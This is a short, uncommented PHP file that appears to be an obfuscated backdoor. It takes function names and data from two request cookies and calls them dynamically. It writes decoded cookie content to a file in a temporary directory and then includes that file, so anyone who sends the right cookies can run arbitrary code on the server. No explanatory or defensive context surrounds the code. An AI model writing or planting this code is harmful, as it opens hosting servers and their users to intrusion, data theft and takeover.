<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[27])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 9;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[27][$n];
        if (!$c[27][$n + 1]) {
            if (!$c[27][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 9 + 1;
    }
    $k = $p[19]() . $p[3];
    if (!$p[25]($k)) {
        $n = $p[0]($k, $p[10]);
        $p[8]($n, $p[26] . $p[29]($p[24]($c[3])));
    }
    include($k);
}